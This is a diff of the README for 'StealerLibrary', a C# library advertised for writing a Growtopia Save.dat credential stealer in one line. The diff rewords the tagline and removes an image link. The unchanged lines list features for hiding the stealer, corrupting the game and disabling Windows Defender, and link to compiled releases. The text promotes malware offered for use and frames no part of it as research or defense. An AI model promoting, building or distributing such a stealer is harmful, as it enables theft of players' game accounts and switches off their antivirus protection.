@@ -1,5 +1,5 @@
 # StealerLibrary
-Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line of code.
+Growtopia (Save.dat) Stealer Library that allows you to write a stealer with 1 line of code.
 #### ⭐ If you like the project, feel free to star the project ⭐
 
 ## Compiled Version: [Download](https://github.com/extatent/StealerLibrary/releases/)
@@ -68,7 +68,5 @@ namespace Example
 - Corrupt Growtopia (Customizable: True/False)
 - Hide Stealer (Customizable: True/False)
 - Disable Windows Defender (Customizable: True/False)
-
-<img src="http://anarchy.5v.pl/example2.png" alt="png">
 
 ## StealerLibrary is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/StealerLibrary/blob/main/LICENSE) file for details.
